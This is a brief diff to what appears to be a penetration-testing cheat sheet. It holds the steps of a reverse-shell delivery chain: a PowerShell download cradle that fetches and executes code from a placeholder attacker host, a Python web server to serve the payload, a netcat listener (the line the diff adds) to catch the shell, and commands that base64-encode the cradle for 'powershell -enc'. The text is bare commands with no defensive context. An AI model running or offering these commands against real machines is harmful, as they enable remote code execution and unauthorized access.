@@ -8,6 +8,8 @@ cradle content:- IEX(New-Object Net.WebClient).downloadString("http://attacker_i
 
 python3 -m http.server 8000
 
+rlwrap nc -lvnp 9001
+
 cat cradle | iconv -t utf-16le | base64 -w0; echo
 
 powershell -enc <encoded_code>
